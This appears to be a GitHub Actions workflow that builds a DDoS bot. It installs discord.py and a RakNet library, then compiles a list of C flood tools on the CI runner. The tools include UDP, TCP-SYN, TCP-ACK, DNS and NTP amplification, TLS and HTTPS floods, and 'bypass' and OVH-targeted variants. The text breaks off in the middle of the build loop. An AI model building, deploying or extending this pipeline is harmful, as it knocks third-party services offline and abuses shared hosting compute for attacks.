name: BOTDDOS L4 and L7

on:
  workflow_dispatch:
  push:
    branches:
      - main

jobs:
  build-and-run:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: Set up Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.21'

      - name: Install Go dependencies
        run: |
          go mod init bot 2>/dev/null || true
          go get github.com/sandertv/go-raknet 2>/dev/null || true
          go get github.com/sirupsen/logrus 2>/dev/null || true

      - name: Install Python dependencies
        run: |
          python -m pip install --upgrade pip
          pip install discord.py

      - name: Install build tools
        run: |
          sudo apt-get update
          sudo apt-get install -y build-essential gcc g++ make libpcap-dev libssl-dev wget

      - name: Build binaries
        run: |
          echo "=== COMPILANDO BINARIOS ==="
          
          # Compilar m√©todos principales
          binaries=(
            "udp.c:udp"
            "udphex.c:udphex"
            "udppps.c:udppps"
            "ovh.c:ovh:-lpcap"
            "udppayload.c:udppayload"
            "udpbypass.c:udpbypass"
            "tcp.c:tcp"
            "tcp-ack.c:tcp-ack:-lpcap"
            "tcp-tls.c:tcp-tls:-lssl -lcrypto"
            "dns.c:dns"
            "ntp.c:ntp"
            "httpsraw.c:httpsraw"
            "tls.c:tls:-lssl -lcrypto"
            "httpsrequest.c:httpsrequest"
            "tcp-syn.c:tcp-syn:-lpthread"
          )
          
          for entry in "${binaries[@]}"; do
            IFS=':' read -r source binary libs <<< "$entry"
            
            if [ -f "$source" ]; then
              echo -n "üî® $source ‚Üí $binary ... "
              
              if [ -n "$libs" ]; then
                gcc -O3 -pthread "$source" -o "$binary" $libs 2>/dev/null && {
                  chmod +x "$binary"
                  echo "‚úÖ"
                } || echo "‚ö†Ô∏è"
              else
                gcc -O3 -pthread "$source" -o "$binary" 2>/dev/null && {
                  chmod +x "$binary"
                  echo
